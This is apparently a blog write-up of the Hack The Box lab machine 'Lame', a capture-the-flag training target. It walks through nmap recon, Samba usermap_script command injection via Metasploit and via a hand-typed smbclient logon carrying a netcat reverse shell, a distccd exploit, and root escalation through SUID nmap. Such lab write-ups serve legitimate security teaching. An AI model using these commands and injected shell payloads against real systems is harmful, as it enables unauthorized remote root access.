---
title: "Hack The Box - Lame"
date: 2022-06-07T17:29:31+05:30
draft: false
description: " Lame from HackTheBox is an retired machine which is vulnerable to infamous CVE - 2007-2447 & 2004-2687 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit "
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- samba
- CVE-ID-2007-2447
- CVE-ID-2004-2687
series:
- Pratical Ethical Hacking TCM
categories:
- Easy
- HackTheBox
- Linux
- CVE Exploitation 
- Metasploit
- Public Exploit
libraries:

image: /images/hackthebox/lame/Lame.png
---

Hi Hackers Welcome Back, Today we are going to look at Hack The Box Blue Machine.

{{< img src="/images/hackthebox/lame/image.png" alt="image alt" width="450px"  position="center" >}}
## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Lame</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td><a href="https://www.hackthebox.eu/home/users/profile/1"><img src="https://www.hackthebox.eu/badge/image/1" alt="" style="display: unset"></a>  </td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the service, which is vulnerable to infamous CVE - 2007-2447 & 2004-2687. Samba vulnerabilities which can be easily exploited with publicly available scripts and Metasploit. 

## Mind Map 
{{< img src="/images/hackthebox/lame/1.png" alt="image alt" width="1000px"  position="center" >}}

## Recon 

 we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

 All port scan 

 ``` bash 
 ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]
└──_ $nmap -Pn -p- 10.129.99.174 -oN ap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 17:46 IST
Stats: 0:08:33 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 70.62% done; ETC: 17:58 (0:03:33 remaining)
Nmap scan report for 10.129.99.174
Host is up (0.34s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 1297.12 seconds1

```
Service version scan

 ``` bash {hl_lines=[22, 8, 27]}
 ─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]                                                                                                                                                          
└──_ $nmap -Pn -sV -sC -A 10.129.99.174 -oN scsva                                                                                                                                                                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 17:39 IST                                                                                                                                                    
Nmap scan report for 10.129.99.174                                                                                                                                                                                 
Host is up (0.34s latency).                                                                                                                                                                                        
Not shown: 996 filtered tcp ports (no-response)                                                                                                                                                                    
PORT    STATE SERVICE     VERSION                                                                                                                                                                                  
21/tcp  open  ftp         vsftpd 2.3.4                                                                                                                                                                             
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                             
| ftp-syst:                                                                                                                                                                                                        
|   STAT:                                                                                                                                                                                                          
| FTP server status:                                                                                                                                                                                               
|      Connected to 10.10.14.102                                                                                                                                                                                   
|      Logged in as ftp                                                                                                                                                                                            
|      TYPE: ASCII                                                                                                                                                                                                 
|      No session bandwidth limit                                                                                                                                                                                  
|      Session timeout in seconds is 300                                                                                                                                                                           
|      Control connection is plain text                                                                                                                                                                            
|      Data connections will be plain text                                                                                                                                                                         
|      vsFTPd 2.3.4 - secure, fast, stable          
|_End of status                                     
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)                                   
| ssh-hostkey:                                      
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)                                           
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)                                           
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                    
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)                                
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                           

Host script results:                                
|_smb2-time: Protocol negotiation failed (SMB2)     
| smb-os-discovery:                                 
|   OS: Unix (Samba 3.0.20-Debian)                  
|   Computer name: lame                             
|   NetBIOS computer name:                          
|   Domain name: hackthebox.gr                      
|   FQDN: lame.hackthebox.gr                        
|_  System time: 2022-06-03T08:10:34-04:00          
| smb-security-mode:                                
|   account_used: guest                             
|   authentication_level: user                      
|   challenge_response: supported                   
|_  message_signing: disabled (dangerous, but default)                                                   
|_clock-skew: mean: 2h00m27s, deviation: 2h49m46s, median: 24s                                           

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .           
Nmap done: 1 IP address (1 host up) scanned in 79.40 seconds

```
``` bash {hl_lines=[8]}
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]
└──_ $nmap -Pn -A -T4 -p 3632 10.129.99.174
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 02:22 IST
Nmap scan report for 10.129.99.174
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds

```
{{< boxmd >}}
Service and its Version
- 21/tcp  open  ftp        ``` vsftpd 2.3.4 ```
- 22/tcp  open  ssh        ``` OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) ```
- 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- 445/tcp open  netbios-ssn Samba ```smbd 3.0.20-Debian (workgroup: WORKGROUP)```
- 3632/tcp open  distccd distccd v1 ``` ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) ```

{{< /boxmd >}}

## Enumeration  port 21 

The version of the vsftp is vulnerable to CVE: CVE-2011-2523, i have tried both metasploit and public exploit but nothing helped me probably they might be patched, 

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]
└──_ $ftp 10.129.99.174
Connected to 10.129.99.174.
220 (vsFTPd 2.3.4)
Name (10.129.99.174:atom): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

## Enumeration port 22

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]
└──_ $searchsploit OpenSSH 4.7p1
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                                         | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                                                   | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                                                     | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                                                                           | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                             | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                         | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                             | linux/remote/45939.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

we did’t find any RCE on this Version, lets we move on other ports if there are any critical vulnerability

## Ennum and Exploit port 139 & 445

we already Know the version let's look into exploit database weather the target version is vulnerable to any exploit

``` bash {hl_lines = [8 ]}
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~]
└──╼ $searchsploit Samba 3.0.20-Debian
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                           | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                 | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                            | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                    | linux_x86/dos/36741.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
### Exploit using Metasploit 

```bash {hl_lines=[1, 28, 30, 33, 36]}
[msf](Jobs:0 Agents:0) >> search Username script

Matching Modules
================

   #   Name                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                    ---------------  ----       -----  -----------
   0   auxiliary/gather/c2s_dvr_password_disclosure            2016-08-19       normal     No     C2S DVR Management Password Disclosure
   1   exploit/windows/http/cyclope_ess_sqli                   2012-08-08       excellent  Yes    Cyclope Employee Surveillance Solution v6 SQL Injection
   2   exploit/linux/http/efw_chpasswd_exec                    2015-06-28       excellent  No     Endian Firewall Proxy Password Change Command Injection
   3   exploit/linux/http/grandstream_ucm62xx_sendemail_rce    2020-03-23       excellent  Yes    Grandstream UCM62xx IP PBX sendPasswordEmail RCE
   4   auxiliary/gather/ipcamera_password_disclosure           2016-08-16       normal     No     JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure
   5   exploit/linux/local/su_login                            1971-11-03       normal     Yes    Login to Another User with Su on Linux / Unix Systems
   6   exploit/windows/smb/psexec                              1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   7   auxiliary/scanner/oracle/oracle_login                                    normal     No     Oracle RDBMS Login Utility
   8   auxiliary/server/pxeexploit                                              normal     No     PXE Boot Exploit Server
   9   exploit/multi/sap/sap_mgmt_con_osexec_payload           2011-03-08       excellent  Yes    SAP Management Console OSExecute Payload Execution
   10  exploit/multi/samba/usermap_script                      2007-05-14       excellent  No     Samba "username map script" Command Execution
   11  exploit/linux/ssh/solarwinds_lem_exec                   2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution
   12  auxiliary/scanner/http/squiz_matrix_user_enum           2011-11-08       normal     No     Squiz Matrix User Enumeration Scanner
   13  exploit/windows/local/wmi_persistence                   2017-06-06       normal     No     WMI Event Subscription Persistence
   14  post/windows/manage/pxeexploit                                           normal     No     Windows Manage PXE Exploit Server
   15  auxiliary/gather/wp_ultimate_csv_importer_user_extract  2015-02-02       normal     Yes    WordPress Ultimate CSV Importer User Table Extract


Interact with a module by name or index. For example info 15, use 15 or use auxiliary/gather/wp_ultimate_csv_importer_user_extract

[msf](Jobs:0 Agents:0) >> use 10

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set rhost 10.129.101.251
rhost => 10.129.101.251

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set lhost 10.10.14.33
lhost => 10.10.14.33

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> run

[*] Started reverse TCP handler on 10.10.14.33:4444 
[*] Command shell session 1 opened (10.10.14.33:4444 -> 10.129.101.251:47514 ) at 2022-06-07 15:03:37 +0530

whoami
root
id
uid=0(root) gid=0(root)

```
### Manual Method
#### Enum samba
``` bash {hl_lines=[7]}
─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]
└──╼ $smbmap -H 10.129.101.251
[+] IP: 10.129.101.251:445	Name: 10.129.101.251                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```
#### Exploit 

``` bash {hl_lines=[2, 21]}
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]                            │┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]
└──_ $smbclient -N //10.129.101.251/tmp/ --option='client min protocol=NT1'          │└──_ $nc -lvnp 4444
Anonymous login successful                                                           │listening on [any] 4444 ...
Try "help" to get a list of possible commands.                                       │connect to [10.10.14.33] from (UNKNOWN) [10.129.101.251] 38753
smb: \> dir                                                                          │whoami
  .                                   D        0  Tue Jun  7 15:06:51 2022           │root
  ..                                 DR        0  Sat Oct 31 12:03:58 2020           │id
  5582.jsvc_up                        R        0  Tue Jun  7 07:49:52 2022           │uid=0(root) gid=0(root)
  .ICE-unix                          DH        0  Tue Jun  7 07:48:41 2022           │
  vmware-root                        DR        0  Tue Jun  7 07:49:47 2022           │
  .X11-unix                          DH        0  Tue Jun  7 07:49:06 2022           │
  .X0-lock                           HR       11  Tue Jun  7 07:49:06 2022           │
  vgauthsvclog.txt.0                  R     1600  Tue Jun  7 07:48:40 2022           │
                                                                                     │
                7282168 blocks of size 1024. 5384924 blocks available                │
smb: \> logon _./=`nohup nc -e /bin/bash 10.10.14.33 4444`"                          │
session setup failed: NT_STATUS_LOGON_FAILURE                                        │
smb: \> logon _./=`nohup nc -e /bin/bash 10.10.14.33 4444`"                          │
session setup failed: NT_STATUS_LOGON_FAILURE                                        │
smb: \> logon "./=`nohup nc -e /bin/bash 10.10.14.33 4444`"                          │
Password:                                                                            │
                                                                                     │
```
## Ennum and Exploit 3632

```bash {hl_lines=[2 ]}
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame]
└──_ $nmap -Pn -p 3632 -sV --script vulners 10.129.101.147
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 18:24 IST
Nmap scan report for 10.129.101.147
Host is up (0.47s latency).

PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```
### Metasploit Exploit
```bash {hl_lines=[1, 13, 15, 38, 41, 43, 67]}
[msf](Jobs:0 Agents:0) >> search distccd 

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

[msf](Jobs:0 Agents:0) >> use 0

[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >> show payloads                                                                                                                                             
                                                                                                                                                                                                                   
Compatible Payloads                                                                                                                                                                                                
===================                                                                                                                                                                                                
                                                                                                                                                                                                                   
   #   Name                                        Disclosure Date  Rank    Check  Description                                                                                                                     
   -   ----                                        ---------------  ----    -----  -----------                                                                                                                     
   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)                                                                                         
   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6                                                                                    
   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)                                                                                         
   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6                                                                                    
   4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution                                                                                         
   5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)                                                                                 
   6   payload/cmd/unix/reverse_bash                                normal  No     Unix Command Shell, Reverse TCP (/dev/tcp)                                                                                      
   7   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)                                                                                    
   8   payload/cmd/unix/reverse_openssl                             normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)                                                                            
   9   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)                                                                                      
   10  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)                                                                                  
   11  payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)                                                                                      
   12  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)                                                                                  
   13  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)                                                                             
                                                                                                                                                                                                                   
 
[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >> set payload 5
payload => cmd/unix/reverse

[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >> set rhost 10.129.101.251

[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >>  set lhost 10.10.14.33

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.129.101.251   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.33      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port 


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >> run 

[*] Started reverse TCP double handler on 10.10.14.33:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo IfVVyVugXAMKqtcu;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 3 opened (10.10.14.33:4444 -> 10.129.101.251:55594 ) at 2022-06-07 14:26:29 +0530


Shell Banner:
IfVVyVugXAMKqtcu
-----
          
whoami
daemon
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
### Priviledge Esclation 

```bash {hl_lines=[1, 46]}
find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null -ls
 16466   68 -rwsr-xr-x   1 root     root        63584 Apr 14  2008 /bin/umount
 16449   20 -rwsr-xr--   1 root     fuse        20056 Feb 26  2008 /bin/fusermount
 16398   28 -rwsr-xr-x   1 root     root        25540 Apr  2  2008 /bin/su
 16418   84 -rwsr-xr-x   1 root     root        81368 Apr 14  2008 /bin/mount
 16427   32 -rwsr-xr-x   1 root     root        30856 Dec 10  2007 /bin/ping
 16457   28 -rwsr-xr-x   1 root     root        26684 Dec 10  2007 /bin/ping6
  8370   68 -rwsr-xr-x   1 root     root        65520 Dec  2  2008 /sbin/mount.nfs
  8252   20 -rwxr-sr-x   1 root     shadow      19584 Apr  9  2008 /sbin/unix_chkpwd
304747    4 -rwsr-xr--   1 root     dhcp         2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script 
344359  112 -rwsr-xr-x   2 root     root       107776 Feb 25  2008 /usr/bin/sudoedit
345080    4 -rwxr-sr-x   1 root     utmp         3192 Apr 22  2008 /usr/bin/Eterm
344440    8 -rwsr-sr-x   1 root     root         7460 Jun 25  2008 /usr/bin/X
344089    8 -rwxr-sr-x   1 root     tty          8192 Dec 12  2007 /usr/bin/bsd-write
344958   12 -rwsr-xr-x   1 root     root         8524 Nov 22  2007 /usr/bin/netkit-rsh
344366   80 -rwxr-sr-x   1 root     ssh         76580 Apr  6  2008 /usr/bin/ssh-agent
344139   40 -rwsr-xr-x   1 root     root        37360 Apr  2  2008 /usr/bin/gpasswd
344689   32 -rwxr-sr-x   1 root     mlocate     30508 Mar  8  2008 /usr/bin/mlocate
344364   28 -rwxr-sr-x   1 root     crontab     26928 Apr  8  2008 /usr/bin/crontab
344317   16 -rwsr-xr-x   1 root     root        12296 Dec 10  2007 /usr/bin/traceroute6.iputils
344359  112 -rwsr-xr-x   2 root     root       107776 Feb 25  2008 /usr/bin/sudo
344959   12 -rwsr-xr-x   1 root     root        12020 Nov 22  2007 /usr/bin/netkit-rlogin
344550   40 -rwxr-sr-x   1 root     shadow      37904 Apr  2  2008 /usr/bin/chage
344284  308 -rwxr-sr-x   1 root     utmp       308228 Oct 23  2007 /usr/bin/screen
344220   20 -rwxr-sr-x   1 root     shadow      16424 Apr  2  2008 /usr/bin/expiry
344230   12 -rwsr-xr-x   1 root     root        11048 Dec 10  2007 /usr/bin/arping
345067  304 -rwxr-sr-x   1 root     utmp       306996 Jan  2  2009 /usr/bin/xterm
344365   20 -rwsr-xr-x   1 root     root        19144 Apr  2  2008 /usr/bin/newgrp
344337   12 -rwxr-sr-x   1 root     tty          9960 Apr 14  2008 /usr/bin/wall
344429   28 -rwsr-xr-x   1 root     root        28624 Apr  2  2008 /usr/bin/chfn
344956  768 -rwsr-xr-x   1 root     root       780676 Apr  8  2008 /usr/bin/nmap
344441   24 -rwsr-xr-x   1 root     root        23952 Apr  2  2008 /usr/bin/chsh
344957   16 -rwsr-xr-x   1 root     root        15952 Nov 22  2007 /usr/bin/netkit-rcp
344771   32 -rwsr-xr-x   1 root     root        29104 Apr  2  2008 /usr/bin/passwd
344792   48 -rwsr-xr-x   1 root     root        46084 Mar 31  2008 /usr/bin/mtr
354594   12 -r-xr-sr-x   1 root     postdrop    10312 Apr 18  2008 /usr/sbin/postqueue
354659   12 -r-xr-sr-x   1 root     postdrop    10036 Apr 18  2008 /usr/sbin/postdrop
354626  268 -rwsr-xr--   1 root     dip        269256 Oct  4  2007 /usr/sbin/pppd
369987    8 -rwsr-xr--   1 root     telnetd      6040 Dec 17  2006 /usr/lib/telnetlogin
385106   12 -rwsr-xr--   1 root     www-data    10276 Mar  9  2010 /usr/lib/apache2/suexec
386116    8 -rwsr-xr-x   1 root     root         4524 Nov  5  2007 /usr/lib/eject/dmcrypt-get-device
377149  168 -rwsr-xr-x   1 root     root       165748 Apr  6  2008 /usr/lib/openssh/ssh-keysign
371390   12 -rwsr-xr-x   1 root     root         9624 Aug 17  2009 /usr/lib/pt_chown
  8415   16 -r-sr-xr-x   1 root     root        14320 Nov  3  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 16687   12 -r-sr-xr-x   1 root     root         9532 Nov  3  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
```
{{< notice success "we have successfully Pwned the Machine " >}}
See you on the next Blog, Happy hacking...
{{< /notice >}}
